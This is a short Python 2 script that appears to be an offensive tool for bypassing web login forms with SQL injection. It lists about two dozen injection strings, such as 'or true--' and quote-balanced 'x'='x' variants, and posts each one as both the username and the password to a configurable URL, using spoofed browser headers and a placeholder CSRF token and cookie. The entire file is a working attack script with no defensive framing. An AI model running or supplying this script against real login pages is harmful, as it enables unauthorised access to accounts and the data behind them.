import urllib2

bypass_payloads = [
"\'-\'",
"\' \'",
"\'&\'",
"\'^\'",
"\'*\'",
"\' or \'\'-\'",
"\' or \'\' \'",
"\' or \'\'&\'",
"\' or \'\'^\'",
"\' or \'\'*\'",
"\"-\'",
"\" \"",
"\"&\"",
"\" or \"\"^\"",
"\" or \"\"*\"",
"or true--",
" or true--",
"\' or true--",
"\") or true--",
"\') or true--",
"\' or \'x\'=\'x",
"\') or (\'x\')=(\'x",
"\')) or ((\'x\'))=((\'x",
"\" or \"x\"=\"x",
"\") or (\"x\")=(\"x",
"\")) or ((\"x\"))=((\"x"
]

token = "thisiswhereuputcsrftoken"
uagent = "Mozilla/5.0 (macosx snow muppet; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
origin = ""
referer = ""
cookie = "time=1514573805.7781953Y0emo3dkVHK3UxRGt3PT"
url_to_test = ""

def request_com(payloads,token,uagent,origin,referer,cookie,url_to_test):
	
    
    
        try:
           print(payloads)
           req = urllib2.Request(url_to_test)
           req.add_header("Connection", "keep-alive")
           req.add_header("Origin", origin)
           req.add_header("X-CSRF-Token", token)
           req.add_header("User-Agent", uagent)
           req.add_header("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
           req.add_header("Accept", "*/*")
           req.add_header("X-Requested-With", "XMLHttpRequest")
           req.add_header("Referer", referer)
           req.add_header("Accept-Encoding", "gzip, deflate, br")
           req.add_header("Accept-Language", "en-US,en;q=0.9")
           req.add_header("Cookie", cookie)

    
        
           body = "username=" + payloads + "&password=" +payloads 

           response= urllib2.urlopen(req, body)
           return response.read()
        except:
            pass
	

for payloads in bypass_payloads:
    response = request_com(payloads,token,uagent,origin,referer,cookie,url_to_test)
    print(response)
